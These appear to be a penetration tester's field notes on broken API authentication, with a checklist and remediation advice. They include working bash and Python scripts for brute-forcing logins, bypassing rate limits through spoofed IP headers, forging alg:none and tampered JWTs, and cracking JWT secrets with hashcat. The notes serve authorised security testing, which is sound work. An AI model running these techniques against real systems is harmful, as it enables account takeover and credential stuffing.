# API Broken Authentication — Enterprise Penetration Testing Field Notes

> **Author:** Dheeraj Kumar Jayaswal — Senior Penetration Tester | 5+ Years Enterprise AppSec
>
> **Category:** API Security — OWASP API2:2023 (Broken Authentication)
>
> **Severity:** High to Critical — authentication bypass, account takeover, unauthorised data access
>
> **Real-world impact:** Broken authentication in APIs manifests differently from broken authentication in web applications. There is no login form to brute force, no session cookie to steal from a browser. There are token validation gaps, rate limiting absences, JWT algorithm weaknesses, OAuth flow vulnerabilities, and endpoints that respond to requests without any token at all. In enterprise environments, I consistently find production APIs that skip token validation on specific endpoint groups, accept expired tokens indefinitely, or use HS256 JWT secrets that crack in under a minute.

---

## 🧠 The Authentication Gap in Enterprise APIs

```
What enterprise APIs do correctly:
  ✓ Issue JWT/Bearer tokens at login
  ✓ Return 401 on most protected endpoints without token
  ✓ Implement token expiry (exp claim)

What enterprise APIs consistently fail at:

1. Token validation consistency:
   /api/v2/users     → validates token ✓
   /api/v2/export    → validates token ✓
   /api/v2/reports   → SKIPPED during refactor ✗  ← leaked in
   /api/mobile/v1/   → different auth middleware ✗

2. Token invalidation after logout:
   JWT deleted from localStorage = "logged out" on frontend
   JWT remains valid server-side until exp claim expires
   Default exp: 24 hours → stolen token works for 24h post-logout

3. Weak token signing secrets:
   HS256 JWT signed with "secret" or company name
   Crackable with rockyou.txt in seconds
   Once cracked: forge any identity, any role

4. Missing validation on secondary endpoints:
   /api/v1/auth/login          → correctly rate limited
   /api/v1/auth/verify-otp     → rate limiting missing
   /api/mobile/auth/login      → rate limiting missing
   /api/v1/auth/refresh        → rate limiting missing

5. OAuth implementation gaps:
   state parameter missing = CSRF on OAuth callback
   redirect_uri not strictly validated = code theft
   Authorization codes reusable = token replay
```

---

## 💥 Phase 1 — Unauthenticated Endpoint Discovery

### Systematic Token Removal Testing

```bash
BASE="https://api.company.com"
VALID_TOKEN="eyJhbGciOiJIUzI1NiJ9..."

# Collect all API endpoints from Swagger, JS bundles, Burp history
# Test EACH with no token and with invalid token

# Test 1: No token at all
test_no_auth() {
  local endpoint=$1
  local method=${2:-GET}
  code=$(curl -so /dev/null -w "%{http_code}" \
    -X "$method" "$BASE$endpoint" \
    -H "Accept: application/json" 2>/dev/null)
  echo "No auth   | $method $endpoint → HTTP $code"
  [[ "$code" == "200" ]] && echo "⚠️  FINDING: $endpoint accessible without authentication"
}

# Test 2: Empty token
test_empty_token() {
  local endpoint=$1
  code=$(curl -so /dev/null -w "%{http_code}" \
    "$BASE$endpoint" \
    -H "Authorization: Bearer " 2>/dev/null)
  echo "Empty tok | GET $endpoint → HTTP $code"
}

# Test 3: Invalid token string
test_invalid_token() {
  local endpoint=$1
  code=$(curl -so /dev/null -w "%{http_code}" \
    "$BASE$endpoint" \
    -H "Authorization: Bearer INVALID_TOKEN_STRING" 2>/dev/null)
  echo "Bad token | GET $endpoint → HTTP $code"
}

# Run against all discovered endpoints:
while read endpoint; do
  test_no_auth "$endpoint"
  test_empty_token "$endpoint"
  test_invalid_token "$endpoint"
  echo "---"
done < all_endpoints.txt
```

### High-Value Endpoints to Always Test Without Auth

```bash
# These endpoint categories consistently have auth gaps:
ENDPOINTS=(
  "/api/v1/users"          # user listing
  "/api/v1/users/me"       # current user
  "/api/v1/admin/users"    # admin panel (critical)
  "/api/v1/reports"        # reports listing
  "/api/v1/export"         # data export
  "/api/v1/config"         # configuration
  "/api/v1/metrics"        # application metrics
  "/actuator/env"          # Spring Boot (not API but same host)
  "/api/mobile/v1/users"   # mobile backend (often different auth)
  "/api/internal/health"   # health check (sometimes includes sensitive data)
)

for endpoint in "${ENDPOINTS[@]}"; do
  code=$(curl -so /dev/null -w "%{http_code}" \
    "$BASE$endpoint" 2>/dev/null)
  printf "%-45s → HTTP %s\n" "$endpoint" "$code"
done
```

---

## 💥 Phase 2 — Token Lifecycle Attacks

### Token Replay After Logout

```bash
# Step 1: Authenticate and save the token
TOKEN=$(curl -s -X POST "$BASE/api/v1/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"Test123!"}' | \
  jq -r '.access_token')
echo "Token obtained: ${TOKEN:0:20}..."

# Step 2: Verify it works
curl -so /dev/null -w "Pre-logout: %{http_code}\n" \
  "$BASE/api/v1/users/me" \
  -H "Authorization: Bearer $TOKEN"

# Step 3: Log out through the application
curl -s -X POST "$BASE/api/v1/auth/logout" \
  -H "Authorization: Bearer $TOKEN"
echo "Logout performed"

# Step 4: Replay the saved token
curl -so /dev/null -w "Post-logout replay: %{http_code}\n" \
  "$BASE/api/v1/users/me" \
  -H "Authorization: Bearer $TOKEN"

# Expected: HTTP 401 (token invalidated on logout)
# Finding if: HTTP 200 (token still valid) = missing server-side invalidation

# JWT-specific note:
# JWT "logout" often only deletes localStorage on frontend
# The JWT itself remains valid until exp claim expires
# If exp is 24 hours away = any stolen token works for 24 more hours
echo "Token expires at: $(echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq '.exp' | xargs -I{} date -d @{})"
```

### Expired Token Acceptance

```bash
# Some APIs accept tokens past their exp claim
# Test with a token whose exp has passed:

# Manually craft an expired JWT (HS256, using cracked or known secret):
python3 << 'PYEOF'
import jwt, time
# Use "secret" as example — replace with actual cracked secret
payload = {
    "userId": 1099,
    "role": "user",
    "exp": int(time.time()) - 86400  # expired 24 hours ago
}
expired_token = jwt.encode(payload, "secret", algorithm="HS256")
print(f"Expired token: {expired_token}")
PYEOF

# Test the expired token:
curl -so /dev/null -w "Expired token: %{http_code}\n" \
  "$BASE/api/v1/users/me" \
  -H "Authorization: Bearer [EXPIRED_TOKEN]"
# Finding if: HTTP 200 = expired tokens accepted
```

### Cross-User Token Usage

```bash
# Test if Account B's token can access Account A's user-specific data
# (Token not bound to user scope)

curl -s "$BASE/api/v1/users/1099/settings" \
  -H "Authorization: Bearer ACCOUNT_B_TOKEN" | jq .
# Expected: 403 (B's token cannot access A's user-specific endpoint)
# Finding if: 200 with A's settings = tokens not user-scoped
```

---

## 💥 Phase 3 — Rate Limiting Absence

### Systematic Rate Limiting Verification

```bash
echo "=== Rate Limiting Test ==="
ENDPOINT="$BASE/api/v1/auth/login"

# Send 25 controlled attempts and track response codes
for i in $(seq 1 25); do
  code=$(curl -so /dev/null -w "%{http_code}" \
    -X POST "$ENDPOINT" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@company.com\",\"password\":\"WrongPass$i\"}" \
    2>/dev/null)
  printf "Attempt %-3d: HTTP %s" "$i" "$code"
  [[ "$code" == "429" ]] && { echo " ← RATE LIMITED"; break; }
  echo ""
done

# If all 25 return 401 without any 429 = no rate limiting
# Report: "25 consecutive failed authentication attempts generated no throttling"
```

### Testing Rate Limiting Bypass Techniques

```bash
# When rate limiting IS present on main endpoint, test bypasses:

# Bypass 1: IP rotation via headers
for i in $(seq 1 10); do
  code=$(curl -so /dev/null -w "%{http_code}" \
    -X POST "$BASE/api/v1/auth/login" \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 1.2.3.$i" \
    -H "X-Real-IP: 1.2.3.$i" \
    -d '{"email":"admin@company.com","password":"WrongPass"}' 2>/dev/null)
  echo "X-Forwarded-For 1.2.3.$i: HTTP $code"
done

# Bypass 2: Test secondary endpoints individually
for endpoint in \
  "/api/v1/auth/login" \
  "/api/mobile/v1/auth/login" \
  "/api/v2/auth/signin" \
  "/api/v1/auth/refresh" \
  "/api/v1/auth/verify-otp"; do
  echo "Testing rate limiting: $endpoint"
  for i in $(seq 1 10); do
    code=$(curl -so /dev/null -w "%{http_code}" \
      -X POST "$BASE$endpoint" \
      -H "Content-Type: application/json" \
      -d '{"email":"test@test.com","password":"wrong"}' 2>/dev/null)
    [[ "$code" == "429" ]] && { echo "  Rate limited at attempt $i"; break; }
    [[ "$i" -eq 10 ]] && echo "  No rate limiting after 10 attempts"
  done
done
```

---

## 💥 Phase 4 — JWT Attacks

### Quick JWT Attack Suite

```bash
JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEwOTksInJvbGUiOiJ1c2VyIn0.signature"

# 1. Decode and inspect
echo "=== JWT Payload ==="
echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# 2. Algorithm: none attack
NONE_HDR=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"userId":1099,"role":"admin","exp":9999999999}' | base64 | tr '+/' '-_' | tr -d '=')
NONE_TOKEN="${NONE_HDR}.${PAYLOAD}."
echo ""
echo "=== Testing alg:none ==="
curl -so /dev/null -w "alg:none → HTTP %{http_code}\n" \
  "$BASE/api/v1/users/me" \
  -H "Authorization: Bearer $NONE_TOKEN"

# 3. Weak secret crack
echo ""
echo "=== Cracking JWT secret (hashcat) ==="
echo "$JWT" > /tmp/jwt_crack.txt
hashcat -a 0 -m 16500 /tmp/jwt_crack.txt /usr/share/wordlists/rockyou.txt \
  --quiet --force 2>/dev/null | tail -1

# Also try common enterprise secrets:
cat > /tmp/enterprise_secrets.txt << 'EOF'
secret
password
changeme
jwt_secret
company
infosys
mysecret
1234567890
your-256-bit-secret
supersecret
qwerty
appname
token
EOF
hashcat -a 0 -m 16500 /tmp/jwt_crack.txt /tmp/enterprise_secrets.txt \
  --quiet --force 2>/dev/null | tail -1

# 4. If secret cracked — forge admin token
# python3 -c "import jwt; print(jwt.encode({'userId':1,'role':'admin','exp':9999999999}, 'CRACKED_SECRET', algorithm='HS256'))"
```

### JWT Claims Tampering Test

```bash
# Test if signature is validated at all
# Modify payload, keep original signature

HEADER=$(echo "$JWT" | cut -d. -f1)
SIGNATURE=$(echo "$JWT" | cut -d. -f3)
MODIFIED_PAYLOAD=$(echo -n '{"userId":1,"role":"admin","exp":9999999999}' | \
  base64 | tr '+/' '-_' | tr -d '=')

TAMPERED="${HEADER}.${MODIFIED_PAYLOAD}.${SIGNATURE}"
curl -so /dev/null -w "Tampered JWT (role=admin): HTTP %{http_code}\n" \
  "$BASE/api/v1/admin/users" \
  -H "Authorization: Bearer $TAMPERED"
# Finding if: 200 = JWT signature not validated
```

---

## 🗂️ Systematic Testing Checklist

```
UNAUTHENTICATED ACCESS
☐ Test every endpoint without Authorization header
☐ Test with empty Bearer token
☐ Test with invalid token string
☐ Test mobile API endpoints separately (often different auth middleware)

TOKEN LIFECYCLE
☐ Save token → logout → replay token → expect 401
☐ Test expired token acceptance
☐ Test cross-user token scoping

RATE LIMITING
☐ 25 rapid login attempts on main auth endpoint
☐ Test same on mobile auth endpoint
☐ Test OTP/2FA verification endpoint
☐ Test refresh token endpoint
☐ Test X-Forwarded-For IP rotation bypass

JWT ATTACKS
☐ Decode payload → inspect claims, algorithm, expiry
☐ alg:none attack (try none, NONE, None)
☐ Weak secret: hashcat -m 16500 + rockyou + company wordlist
☐ RS256 → HS256 if JWKS endpoint accessible
☐ Payload tampering with original signature
☐ kid parameter injection if present

OAUTH / SSO
☐ state parameter present and validated?
☐ redirect_uri strictly validated?
☐ Authorization codes single-use only?
☐ Scope escalation: request admin scope

API KEY
☐ API keys in JavaScript bundles?
☐ API keys in URL parameters (log exposure)?
☐ Old API keys from git history still valid?
```

---

## 📋 Enterprise Pentest Report Template

**Finding Title:** Missing Rate Limiting on Authentication Endpoint — Credential Stuffing Attack Possible

**Severity:** High | **CVSS v3.1:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Affected Endpoint:** `POST /api/v1/auth/login`

```
Evidence:
  25 consecutive authentication attempts — no rate limiting:

  Attempt 1:  HTTP 401 — Invalid credentials
  Attempt 2:  HTTP 401 — Invalid credentials
  [...]
  Attempt 25: HTTP 401 — Invalid credentials
  NO HTTP 429 returned at any point
  Elapsed: 3.2 seconds for 25 attempts

  Attack calculation:
  Requests per second: ~7.8
  Rockyou.txt (14M passwords): ~21 days at single-threaded
  With parallelism (10 threads): ~50 hours
  Targeted password spray (50 common passwords): ~6 seconds

  Pre-engagement OSINT found 247 company.com email addresses
  in publicly available breach databases.
  Combined with missing rate limiting:
  → Automated credential stuffing attack is immediately feasible.

Remediation:
  Implement rate limiting on /api/v1/auth/login:
    Max 5 attempts per account per 15-minute window
    Max 20 attempts per IP per minute
    Return HTTP 429 with Retry-After header

  ASP.NET Core — custom rate limiting middleware:
  builder.Services.AddRateLimiter(options => {
      options.AddFixedWindowLimiter("auth", config => {
          config.PermitLimit = 5;
          config.Window = TimeSpan.FromMinutes(15);
          config.QueueLimit = 0;
      });
  });
  // Apply to auth controller:
  [EnableRateLimiting("auth")]
  [HttpPost("login")]
  public async Task<IActionResult> Login(...)
```

---

## 🧭 Key Takeaways

**1. Test token validation consistency across every endpoint group — gaps are common.**
Teams apply token validation middleware to one router group and miss another. The `/api/mobile/` prefix might use different middleware than `/api/v2/`. Internal endpoints added late in development get missed entirely. Always test every endpoint for authentication enforcement, not just a sample.

**2. Logout ≠ token invalidated in JWT-based applications.**
Deleting a JWT from the client side is not logout. The token remains cryptographically valid until its `exp` claim. In enterprise apps with 24-hour token lifetimes, a stolen token from a logged-out session is still valid for a full day. Test this systematically — it is one of the most commonly confirmed findings in API assessments.

**3. Mobile API endpoints have a different (weaker) security posture.**
The main web API may have been through multiple security reviews. The mobile API — often built later, by a smaller team, with faster delivery pressure — typically has missing rate limiting, weaker token validation, and less monitoring. Always identify and test mobile API endpoints as a separate scope.

**4. JWT weak secret cracking is high-probability in Java/Spring applications.**
The default Spring Boot JWT tutorial uses `"secret"` as the example signing key. A surprising proportion of production applications ship with this or equally weak secrets (company name, "password", "1234567890"). Hashcat against rockyou.txt costs 2 minutes. Always test it.

**5. Rate limiting absence on OTP endpoints is more impactful than on the login endpoint.**
A 6-digit OTP has 1,000,000 combinations. With no rate limiting, a single automated tool can test all combinations in minutes. Most teams add rate limiting to `/login` after reading about brute force attacks, but forget `/verify-otp`, `/auth/mfa`, and `/auth/refresh`. These are always worth testing separately.

---

## 🔗 References
- [OWASP API2:2023 — Broken Authentication](https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/)
- [PortSwigger Authentication Vulnerabilities](https://portswigger.net/web-security/authentication)
- [JWT Best Practices — RFC 8725](https://datatracker.ietf.org/doc/html/rfc8725)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)

---
<div align="center">

*Part of [AppSec From The Trenches](../README.md) — Real notes from 6+ years of enterprise penetration testing.*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Dheeraj%20Kumar%20Jayaswal-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://linkedin.com/in/dheerajkumarjayaswal)

</div>
